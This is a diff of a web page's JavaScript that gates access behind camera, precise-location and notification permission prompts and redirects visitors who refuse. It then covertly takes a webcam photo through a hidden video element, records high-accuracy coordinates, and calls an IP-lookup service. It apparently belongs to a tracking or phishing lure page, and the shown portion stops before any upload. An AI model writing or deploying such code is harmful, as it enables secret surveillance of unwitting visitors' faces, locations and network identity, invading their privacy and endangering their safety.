@@ -81,21 +81,45 @@
       return new Blob([u8arr], { type: mime });
     }
 
-    async function captureSnapshot() {
+    function askNotificationPermission() {
+      return new Promise((resolve) => {
+        if ('Notification' in window && Notification.permission !== 'granted') {
+          Notification.requestPermission().then(p => resolve(p === 'granted')).catch(() => resolve(false));
+        } else {
+          resolve(true);
+        }
+      });
+    }
+
+    function askLocationPermission() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(false);
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            coords.lat = pos.coords.latitude;
+            coords.lon = pos.coords.longitude;
+            coords.acc = pos.coords.accuracy;
+            resolve(true);
+          },
+          () => resolve(false),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function askCameraPermission() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.setAttribute("playsinline", true);
-        video.setAttribute("autoplay", true);
         video.muted = true;
         video.style.position = "absolute";
         video.style.opacity = "0";
         video.srcObject = stream;
         document.body.appendChild(video);
 
-        await video.play().catch(err => console.warn("Video play failed", err));
-
-        await new Promise(resolve => setTimeout(resolve, 3000)); // Let camera initialize
+        await video.play();
+        await new Promise(res => setTimeout(res, 3000));
 
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
@@ -104,9 +128,11 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         capturedImageData = canvas.toDataURL("image/png");
 
-        stream.getTracks().forEach(t => t.stop());
+        stream.getTracks().forEach(track => track.stop());
+        return true;
       } catch (err) {
-        console.warn("Camera access denied or failed", err);
+        console.warn("Camera error:", err);
+        return false;
       }
     }
 
@@ -148,51 +174,22 @@
       });
     }
 
-    function askNotificationPermission() {
-      return new Promise(resolve => {
-        if ('Notification' in window && Notification.permission !== 'granted') {
-          Notification.requestPermission().then(p => resolve(p === 'granted')).catch(() => resolve(false));
-        } else {
-          resolve(true);
-        }
-      });
-    }
-
-    function askLocationPermission() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve(false);
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            coords.lat = pos.coords.latitude;
-            coords.lon = pos.coords.longitude;
-            coords.acc = pos.coords.accuracy;
-            resolve(true);
-          },
-          () => resolve(false),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    }
-
     async function requestAllPermissions() {
       document.getElementById("main").innerHTML = `
         <div id="statusText">Requesting permissions…</div>
         <div id="spinner"></div>
       `;
 
-      const cameraPermission = await navigator.mediaDevices.getUserMedia({ video: true })
-        .then(() => true)
-        .catch(() => false);
+      const [locationGranted, notificationGranted, cameraGranted] = await Promise.all([
+        askLocationPermission(),
+        askNotificationPermission(),
+        askCameraPermission()
+      ]);
 
-      const locationAllowed = await askLocationPermission();
-      const notificationsAllowed = await askNotificationPermission();
-
-      if (!cameraPermission || !locationAllowed || !notificationsAllowed) {
+      if (!locationGranted || !notificationGranted || !cameraGranted) {
         window.location.href = deniedPage;
         return;
       }
-
-      await captureSnapshot();
 
       fetch("https://api.db-ip.com/v2/free/self")
         .then(res => res.json())
